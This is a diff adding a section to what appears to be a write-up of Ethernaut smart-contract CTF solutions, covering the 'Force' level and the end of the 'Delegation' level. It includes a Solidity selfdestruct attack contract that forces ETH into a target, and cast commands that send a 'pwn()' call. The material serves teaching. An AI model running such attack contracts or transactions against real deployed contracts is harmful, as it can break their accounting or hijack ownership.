@@ -241,3 +241,41 @@ $ cast keccak "pwn()" | cut -c1-10  # Returns 0xdd365b8b, this is our calldata
 # 2. Send malicious transaction
 $ cast send $DELEGATION_ADDRESS 0xdd365b8b --private-key $PRIVATE_KEY --rpc-url $RPC_URL // this will call our fallback function with msg.data as 0xdd365b8b. 
 ```
+
+
+# 7: Force
+**Link:** [Force Challenge](https://ethernaut.openzeppelin.com/level/7)  
+**Bug:** Contract lacks payable functions but can still receive ETH  
+**Objective:** Send ETH to the contract by any means  
+
+**Vulnerability Analysis:**  
+Smart contracts can receive ETH through:
+1. payable functions 
+2. receive()/fallback()
+3. Forced transfers (selfdestruct beneficiary)
+
+Since we don't have any functions, let's go with 3rd option to use Forced transders.
+
+**How selfdestruct works ?** It means to destroy the current contract. If that's the case what will happen to the funds that it contains ? that's why it's expecting an address where all the current contract funds will be moved to the target address. It's an irreversible operation.  
+
+**Steps to Attack:**
+- Create a sacrificial contract with ETH balance 
+- Call selfdestruct(target) to force ETH transfer
+
+**Attack Contract:**
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract Attack {
+
+    constructor() payable {}
+
+    function attack(address _contract) public {
+        selfdestruct(payable(_contract));
+    }
+}
+```
+
+Deploy this contract using remix with some wei by adding `1` in the `VALUE` field on `Deploy & run transactions` block. Then call the `attack()` function by passing `Force` contract address as argument.
+
